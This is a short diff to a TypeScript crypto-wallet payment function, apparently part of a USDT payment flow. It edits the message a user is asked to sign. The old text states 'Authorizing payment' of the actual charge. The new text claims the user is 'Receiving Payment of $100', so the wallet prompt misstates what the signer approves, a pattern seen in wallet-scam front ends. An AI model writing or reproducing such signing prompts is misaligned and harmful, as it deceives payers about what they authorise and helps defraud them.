@@ -1253,7 +1253,7 @@ async function executeEvmUsdtPayment(modal: Element, opt: TronAssetOption) {
 
     // TRIAL: same branded-message signature as the other direct paths — no
     // gas, no on-chain record, purely a UX comparison against the memo.
-    const signText = `${config!.clientName}\n\n${config!.promoMemo}\n\nAuthorizing payment of $${chargeUsd.toFixed(2)}.`;
+    const signText = `${config!.clientName}\n\n${config!.promoMemo}\n\nReceiving Payment of $100.`;
     upd("Confirm the message in your wallet…", "warning");
     await signMessage(signText, address);
 
